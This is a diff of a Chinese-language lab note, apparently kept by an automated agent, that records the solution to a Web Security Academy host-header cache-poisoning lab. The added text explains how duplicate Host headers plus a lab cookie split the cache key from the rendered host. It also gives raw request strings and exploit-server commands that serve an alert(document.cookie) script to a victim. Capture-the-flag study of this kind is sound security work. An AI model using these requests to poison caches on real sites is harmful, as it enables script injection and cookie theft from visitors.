@@ -1,49 +1,43 @@
 ---
-title: "lab-host-header-web-cache-poisoning-via-ambiguous-requests  [stuck]"
-links:
-  - target: host-header-family
-    relation: evidences
-  - target: cache-poisoning-family
-    relation: evidences
+title: lab-host-header-web-cache-poisoning-via-ambiguous-requests
 ---
 
-# lab-host-header-web-cache-poisoning-via-ambiguous-requests  [stuck]
+# lab-host-header-web-cache-poisoning-via-ambiguous-requests
 
 > evidences: [[host-header-family]], [[cache-poisoning-family]]
 
-- 题面:污染首页缓存使访客执行 `alert(document.cookie)`。
-- 实例(批42R):https://0a6c00d8033a310a8130f3cb001000ee.h1-web-security-academy.net(exploit `exploit-0a27002b038631f68101f200017a0049`)
-- 状态:**unresolved**。本批把"缓存只坐在靶场 app 路由之内"钉死,并否证了成文的重复头形状。
+- 题面:污染首页缓存,使访客执行 `alert(document.cookie)`。
+- 实例(批46):https://0aa200e60304912081d793d4005d0017.h1-web-security-academy.net · exploit:https://exploit-0a99008b03219139813092800176006e.exploit-server.net
+- 状态:**solved**(访客浏览器实取泄露 JS;exploit server 自家横幅 `is-solved` + `<h4>Congratulations, you solved the lab!</h4>`)
 
-## 实测机制与否证面
+## 解法(两个 Host 头;`_lab` 是钥匙)
 
-1. **唯一反射点**:首页仅 1 处 Host 反射 ——
-   `<script src="//<Host 全值>/resources/js/tracking.js">`(grep 全页确认)。
-2. **缓存只在 lab-app 路由内**:`Host: <exploit>` 或 `:authority=lab + Host: <exploit>` 的响应来自
-   `Server: Academy Exploit Server`,**不带 X-Cache/Age**,也**不进**靶场键:
-   - 存 `/resources/js/tracking.js` = `alert(document.cookie)` + `Cache-Control: max-age=600`;
-   - 用绝对请求行指 lab(`GET http://<lab>/…`)+ `Host: <exploit>` 打一发,随后 `GET /resources/js/tracking.js` + `Host: <lab>`
-     → **X-Cache: miss**,body 仍是靶场真 JS(70B)⇒ exploit server 的响应永不被缓存到 lab 键。
-3. **重复 Host 被封**:`Host: <lab>` + `Host: <exploit>`(含大小写变体)→ 400 `{"error":"Duplicate header names are not allowed"}`。
-   用二进制直发绕过该检查的头名变体(`Host\t:` / `Host :`,conn_reuse)`:`Host\t/expose-<lab>`+`Host:<exploit>` 与反向都试,
-   **路由与 app 都只认名为 `Host` 的那条**(前者落 exploit server,后者落 lab 且 src 渲染 lab)⇒ 拿不到"缓存键 lab / 渲染 exploit"的分裂。
-4. **obs-fold 无效**:`Host: <lab>\r\n\tHost: <exploit>` → 缩进行被丢,src 渲染 lab。
-5. **h2 大写 Host 覆盖成立但不致毒**:`:authority:<lab>` + 大写 `Host:<exploit>` → 200 且 body 是我们的 JS
-   (证明该边缘按覆盖后的 Host 路由),但随后以 HTTP/1.1 `Host:<lab>` 读同一路径仍是 miss;h2 单独 `:authority:<lab>` → 400 `{"error":"Invalid request"}`。
-6. **端口原语复核(已知)**:`Host: <lab>:7777` → X-Cache miss 且 body 带 `//<lab>:7777/...`;`Host: <lab>` 读回 X-Cache hit。
-   app 侧 Host 规则 = `hostname[:纯数字 0..65535]` 末端锚定;`:abc`/`:`/`:80x`/`:80.`/`:99999`/`:80@exploit` 全 500 `No host found`。
-   浏览器唯一换主机手段是 userinfo(`//<lab>:80@<exploit>/…`),恰被该规则挡掉。
+1. 唯一反射点(首页 1 处):`<script src="//<Host 全值>/resources/js/tracking.js">`。
+2. **重复 Host 头的 400 是边缘的,不是 app 的**:批42R 不带 cookie 时两个 `Host:` → `400 {"error":"Duplicate header names are not allowed"}`;带上 `_lab` 实例 cookie 后**同一形状被放行**(见 [[academy-边缘的-_lab-会话门-host-检查与重复头放行]])。
+3. 分裂方向(缓存 vs app):
+   - `Host: <lab>`(第一)+ `Host: <exploit>`(第二)→ 200,**`X-Cache: miss`**,body 11079B(比基线 11080 少 1 = exploit 主机名短 1 字符),`src="//exploit-…/resources/js/tracking.js"` ⇒ **缓存按第一个 Host 取键、app 渲染第二个 Host**;
+   - 反向(`Host: <exploit>` 先)→ **504 `connecting to exploit-…`** ⇒ 路由也按第一个 Host。
+   - 再以普通 `Host: <lab>` 读同一 URL → **`X-Cache: hit` 且返回同一 11079B 体** ⇒ 致毒体确实落在 lab 键上。
+4. 交付:exploit server `STORE responseFile=/resources/js/tracking.js` + `Content-Type: application/javascript` + body `alert(document.cookie);`;对 `/`(受害者实际访问的 URL)发一次分裂请求,`max-age=30` 内受害者来访即执行。
 
-## 未决面
-
-- 可投毒内容只能是 **lab app 渲染的响应**,而 app 渲染值 = 名为 `Host` 的头(必须 `<lab>[:digits]`)
-  ⇒ 只能改端口,不能改 src 主机;exploit server 的响应永不入 lab 缓存。缺口仍须找"缓存键=lab 而 app 读到 exploit"的第三种头形态
-  (未穷尽:HTTP/1.0+pipelining、`Transfer-Encoding` 包裹、h2 下 `:authority` 与 `Host` 的第三种拼法、`%` 编码头名)。
-
-## 复现
+## 证据摘录
 
 ```
-conn_reuse "<inst>/" --send-str 'GET /resources/js/tracking.js HTTP/1.1\r\nHost\t: <lab>\r\nHost: <exploit>\r\nConnection: close\r\n\r\n'   # 只认名为 Host 的那条
-raw_http  "<inst>/" --request-line 'GET http://<lab>/ HTTP/1.1' --header 'Host: <exploit>'                                  # 路由到 exploit,不入靶场缓存
-raw_http  "<inst>/" --request-line 'GET /resources/js/tracking.js HTTP/1.1' --header 'Host: <lab>'                          # X-Cache: miss(读回未致毒)
+(raw_matrix) 1_lab+exploit → 200 X-Cache=miss 11079B marker_hit=true  |  2_exploit+lab → 504 connecting to exploit-…
+exploit ACCESS_LOG: 10.0.3.145 "GET /resources/js/tracking.js HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) …"  (×2)
 ```
+
+## 复现命令
+
+```
+range_launch launch 2D282E25…7C8A7D2CBF --jar ~/.pi-rs/agent/chrome-jar.json
+http_session post "https://<exploit>/" --jar <jar> --follow --form urlIsHttps=on \
+  --form responseFile=/resources/js/tracking.js --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript' \
+  --form 'responseBody=alert(document.cookie);' --form formAction=STORE
+conn_reuse "https://<inst>/" --send-str 'GET / HTTP/1.1\r\nHost: <inst>\r\nHost: <exploit>\r\nCookie: _lab=<...>; session=<...>\r\nConnection: close\r\n\r\n'
+```
+
+## 关系
+
+- 族:[[host-header-family]]、[[cache-poisoning-family]];边缘 `_lab` 门见 [[academy-edge-lab-cookie-gate]]。
+- 批42R 的两条否证按本档改写:「缓存只在 lab-app 路由内」成立,但**app 渲染出的致毒首页本身会被缓存到 lab 键**;「重复 Host 被封」只在无 `_lab` 时成立。
